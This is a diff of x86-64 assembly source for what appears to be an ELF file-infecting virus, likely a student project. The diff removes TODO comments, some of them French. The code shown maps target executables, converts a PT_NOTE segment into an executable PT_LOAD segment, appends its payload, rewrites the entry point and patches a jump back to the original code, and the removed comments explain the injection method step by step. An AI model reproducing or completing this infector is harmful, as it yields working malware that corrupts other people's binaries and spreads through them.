@@ -93,11 +93,9 @@ endstruc
 
 section .text
 
-; TODO Fork to return faster to original code?
 _start:
 	nop
-	; WTF ça bug si on lance avec lldb https://stackoverflow.com/questions/29042713/self-modifying-code-sees-a-0xcc-byte-but-the-debugger-doesnt-show-it
-	; TODO See if something is possible ?
+	; https://stackoverflow.com/questions/29042713/self-modifying-code-sees-a-0xcc-byte-but-the-debugger-doesnt-show-it
 begin:
 	; save all registers
 	push rax
@@ -295,7 +293,6 @@ treat_file:
 	jl .close_file					; 	goto .close_file
 
 	; Reserve file size + payload size (for PT_NOTE method)
-	; TODO Check man 2 and 3P of mmap. Not sure if I can do this
 	; https://stackoverflow.com/questions/15684771/how-to-portably-extend-a-file-accessed-using-mmap
 	mov rax, SYS_MMAP				; _ret = mmap(
 	xor rdi, rdi					; 	0,
@@ -339,7 +336,6 @@ treat_file:
 	mov [payload_offset], rax			; ...
 	mov rdi, [mappedfile]				; _new_vaddr = get_next_available_vaddr(mappedfile);
 	call get_next_available_vaddr			; ...
-	; TODO Check error
 
 	; Align new_vaddr to offset in file such as offset = vaddr % PAGE_SIZE
 	mov rdi, [payload_offset]			; _offset_from_page = payload_offset;
@@ -367,7 +363,6 @@ treat_file:
 	jl .unmap_file					; 	goto .unmap_file
 
 	; Get address of the start of the current page
-	; TODO Do something about old_filesize but we use [filesize]
 	xor rdx, rdx					; _offset = old_filesize / page_size
 	mov rax, [filesize]				; ...
 	mov rdi, PAGE_SIZE				; ...
@@ -400,11 +395,9 @@ treat_file:
 	; compute jmp_value
 	mov rdi, [mappedfile]				; _jmp_value = file_map
 	add rdi, elf64_hdr.e_entry			; 	->e_entry;
-	mov eax, [rdi]					; ... // TODO "C'est assez petit yolo on s'en fout mais entry est un 64bits"
+	mov eax, [rdi]					; ...
 
-	; TODO J'ai ptêt fait n'importe dans l'autre inject, j'ai modifié pour que ce soit edi mais en fait c'est bien rdi
-	; TODO "C'est assez petit yolo on s'en fout mais entry est un 64bits"
-	sub eax, [new_vaddr]				; _jmp_value -= new_vaddr;	//TODO Precise that new_vaddr = new_entry?
+	sub eax, [new_vaddr]				; _jmp_value -= new_vaddr;
 	sub eax, _jmp_instr - begin			; _jmp_value -= _jmp_instr - begin;
 	sub eax, 5					; _jmp_value -= 5; // Size of jmp instruction
 
@@ -415,8 +408,6 @@ treat_file:
 	inc rdi						; 	+ 1;
 	mov [rdi], eax					; *jmp_value_ptr = _jmp_value;
 
-	; TODO Clean
-	; TODO It sets the new entry. It was above before. But need to put this here
 	mov rdi, [mappedfile]				; _e_entry = &mappedfile->e_entry;
 	add rdi, elf64_hdr.e_entry			; ...
 	mov rax, [new_vaddr]				; *_e_entry = new_vaddr;
@@ -533,7 +524,6 @@ is_elf_64:
 		mov rax, 1				; return 1;
 		ret
 
-; TODO Optimize with find_exec_segment
 ;elf64_phdr *find_note_segment(char const *_file_map)
 ;rax find_note_segment(rdi file_map);
 find_note_segment:
@@ -678,28 +668,7 @@ has_signature:
 ;			       rdx _new_vaddr,
 ;			       rcx _filesz,
 ;			       r8 _memsz);
-; TODO: _memsz Will be useful if we do compression. Else, this parameter is equal to _filesz
 convert_pt_note_to_load:
-	; TODO Search for a PT_NOTE segment
-	; Comment trouver un PT_NOTE segment ?
-	; ELF Header->e_phoff -> offset of program header table
-	; ELF Header->e_phentsize -> Size of a program header
-	; ELF Header->e_phnum -> Number of program header
-	; So, j'ai juste à faire une boucle qui part de e_phoff, et va e_phnum fois,
-	; parcourir des entrées de taille e_phentsize
-	; Direct quand je suis dans le segment, je check son type : il faut que ce soit un PT_NOTE
-	; Si oui je continue, sinon je boucle
-	; Je change les flags pour avoir R E
-	; Changer p_offset pour la fin du fichier (on va mettre le segment à la toute fin)
-	; Changer p_vaddr pour faire en sorte que ça soit foutu dans un endroit où y'a rien 
-	;	2 méthodes :
-	;		mettre très loin un peu au hasard
-	; 		aller lire tous les segments pour voir où ils sont situés (on cherche
-	;			l'offset le plus haut et on ajoute sa taille)
-	; p_filesz: Taille de notre payload
-	; p_memsz: Taille de notre payload (peut changer si jamais on part sur de la décompression
-	;	par exemple)
-	; p_align on va mettre 0x1000
 	%push context
 	%stacksize flat64
 	%assign %$localsize 0
